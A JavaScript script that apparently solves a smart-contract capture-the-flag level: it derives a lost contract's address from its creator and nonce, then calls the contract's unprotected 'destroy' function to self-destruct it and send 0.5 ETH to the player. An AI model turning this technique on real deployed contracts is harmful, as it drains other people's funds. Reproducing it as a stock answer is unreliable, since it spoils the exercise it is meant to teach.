const loader = require('../loader.js')
const web3 = require('../web3.js')
const rlp = require('rlp')
const instance = require('../prompt.js');

(async () => {
  try {
    console.log('Compute pre-deterministic address of SingleToken contract created.')
    /*
    nonce 0: creation of Recovery Contract
    nonce 1: creation of SingleToken Contract
    */
    const singleToken = '0x' + web3.utils.sha3(rlp.encode([instance, 1])).slice(-40)
    console.log(`SingleToken address is ${singleToken}`)

    console.log('Encode function signature:')
    const signature = web3.eth.abi.encodeFunctionCall({
      constant: false,
      inputs: [
        {
          internalType: 'address payable',
          name: '_to',
          type: 'address'
        }
      ],
      name: 'destroy',
      outputs: [],
      payable: false,
      stateMutability: 'nonpayable',
      type: 'function'
    }, [web3.eth.defaultAccount])
    console.log(`Function call signature is ${signature}`)

    console.log('Selfdestruct contract, sending 0.5 ETH to player...')
    await web3.eth.sendTransaction({
      to: singleToken,
      data: signature
    })

    console.log('Done. You can submit your instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
